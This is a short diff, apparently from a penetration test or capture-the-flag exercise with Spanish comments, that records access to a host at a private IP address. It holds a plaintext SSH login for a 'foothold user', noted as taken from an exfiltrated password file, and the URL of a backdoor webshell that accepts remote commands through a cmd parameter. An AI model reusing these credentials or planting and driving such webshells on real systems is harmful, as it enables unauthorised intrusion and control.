@@ -1,0 +1,3 @@
+ssh://jack:WhyIsMyPasswordSoStrongIDK@10.64.189.146:22   # foothold user (exfil de /dir/pass.txt)
+# backdoor webshell (www-data) sobre HTTPS puerto 41312
+https://10.64.189.146:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=<cmd>
